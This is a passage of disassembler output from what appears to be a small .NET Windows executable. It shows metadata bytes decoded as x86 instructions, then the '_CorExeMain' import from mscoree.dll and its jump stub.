  40ce9d:	81 c1 0e 02 04 20    	add    $0x2004020e,%ecx
  40cea3:	00 1d 0e 07 07 03    	add    %bl,0x307070e
  40cea9:	0e                   	push   %cs
  40ceaa:	12 81 c1 02 05 20    	adc    0x200502c1(%ecx),%al
  40ceb0:	02 01                	add    (%ecx),%al
  40ceb2:	0e                   	push   %cs
  40ceb3:	1c 09                	sbb    $0x9,%al
  40ceb5:	07                   	pop    %es
  40ceb6:	05 08 02 0e 11       	add    $0x110e0208,%eax
  40cebb:	29 12                	sub    %edx,(%edx)
  40cebd:	2d 05 00 01 0e       	sub    $0xe010005,%eax
  40cec2:	1d 0e 07 0a 02       	sbb    $0x20a070e,%eax
  40cec7:	11 29                	adc    %ebp,(%ecx)
  40cec9:	11 80 90 04 20 01    	adc    %eax,0x1200490(%eax)
  40cecf:	02 0e                	add    (%esi),%cl
  40ced1:	0b 07                	or     (%edi),%eax
  40ced3:	04 08                	add    $0x8,%al
  40ced5:	02 15 11 25 01 02    	add    0x2012511,%dl
  40cedb:	12 2d 05 15 12 65    	adc    0x65121505,%ch
  40cee1:	01 02                	add    %eax,(%edx)
  40cee3:	0f 10 01             	movups (%ecx),%xmm0
  40cee6:	01 15 12 39 01 1e    	add    %edx,0x1e013912
  40ceec:	00 15 12 65 01 1e    	add    %dl,0x1e016512
  40cef2:	00 0a                	add    %cl,(%edx)
  40cef4:	0a 02                	or     (%edx),%al
  40cef6:	15 11 25 01 02       	adc    $0x2012511,%eax
  40cefb:	11 80 94 0c 07 04    	adc    %eax,0x4070c94(%eax)
  40cf01:	08 12                	or     %dl,(%edx)
  40cf03:	3c 15                	cmp    $0x15,%al
  40cf05:	11 25 01 02 12 2d    	adc    %esp,0x2d120201
  40cf0b:	0a 0a                	or     (%edx),%cl
  40cf0d:	02 15 11 25 01 02    	add    0x2012511,%dl
  40cf13:	11 80 98 0b 07 04    	adc    %eax,0x4070b98(%eax)
  40cf19:	08 0e                	or     %cl,(%esi)
  40cf1b:	15 11 25 01 0e       	adc    $0xe012511,%eax
  40cf20:	12 2d 05 15 12 65    	adc    0x65121505,%ch
  40cf26:	01 0e                	add    %ecx,(%esi)
  40cf28:	0a 0a                	or     (%edx),%cl
  40cf2a:	02 15 11 25 01 0e    	add    0xe012511,%dl
  40cf30:	11 80 9c 0b 07 04    	adc    %eax,0x4070b9c(%eax)
  40cf36:	08 09                	or     %cl,(%ecx)
  40cf38:	15 11 25 01 09       	adc    $0x9012511,%eax
  40cf3d:	12 2d 05 15 12 65    	adc    0x65121505,%ch
  40cf43:	01 09                	add    %ecx,(%ecx)
  40cf45:	03 0a                	add    (%edx),%ecx
  40cf47:	01 09                	add    %ecx,(%ecx)
  40cf49:	0a 0a                	or     (%edx),%cl
  40cf4b:	02 15 11 25 01 09    	add    0x9012511,%dl
  40cf51:	11 80 a0 07 07 03    	adc    %eax,0x30707a0(%eax)
  40cf57:	08 11                	or     %dl,(%ecx)
  40cf59:	29 12                	sub    %edx,(%edx)
  40cf5b:	2d 07 00 01 12       	sub    $0x12010007,%eax
  40cf60:	11 12                	adc    %edx,(%edx)
  40cf62:	81 e1 07 0a 02 11    	and    $0x11020a07,%ecx
  40cf68:	29 11                	sub    %edx,(%ecx)
  40cf6a:	80 a4 07 0a 02 11 29 	andb   $0x11,0x2911020a(%edi,%eax,1)
  40cf71:	11 
  40cf72:	80 a8 05 00 01 1d 05 	subb   $0x5,0x1d010005(%eax)
  40cf79:	0e                   	push   %cs
  40cf7a:	06                   	push   %es
  40cf7b:	20 01                	and    %al,(%ecx)
  40cf7d:	01 11                	add    %edx,(%ecx)
  40cf7f:	81 e9 07 00 01 12    	sub    $0x12010007,%ecx
  40cf85:	69 12 81 c5 00 00    	imul   $0xc581,(%edx),%edx
  40cf8b:	00 b4 cf 00 00 00 00 	add    %dh,0x0(%edi,%ecx,8)
  40cf92:	00 00                	add    %al,(%eax)
  40cf94:	00 00                	add    %al,(%eax)
  40cf96:	00 00                	add    %al,(%eax)
  40cf98:	ce                   	into
  40cf99:	cf                   	iret
  40cf9a:	00 00                	add    %al,(%eax)
  40cf9c:	00 20                	add    %ah,(%eax)
	...
  40cfb2:	00 00                	add    %al,(%eax)
  40cfb4:	c0 cf 00             	ror    $0x0,%bh
	...
  40cfbf:	00 00                	add    %al,(%eax)
  40cfc1:	00 5f 43             	add    %bl,0x43(%edi)
  40cfc4:	6f                   	outsl  %ds:(%esi),(%dx)
  40cfc5:	72 45                	jb     0x40d00c
  40cfc7:	78 65                	js     0x40d02e
  40cfc9:	4d                   	dec    %ebp
  40cfca:	61                   	popa
  40cfcb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40cfd2:	72 65                	jb     0x40d039
  40cfd4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40cfd8:	6c                   	insb   (%dx),%es:(%edi)
  40cfd9:	00 00                	add    %al,(%eax)
  40cfdb:	00 00                	add    %al,(%eax)
  40cfdd:	00 ff                	add    %bh,%bh
  40cfdf:	25 00 20 40 00       	and    $0x402000,%eax
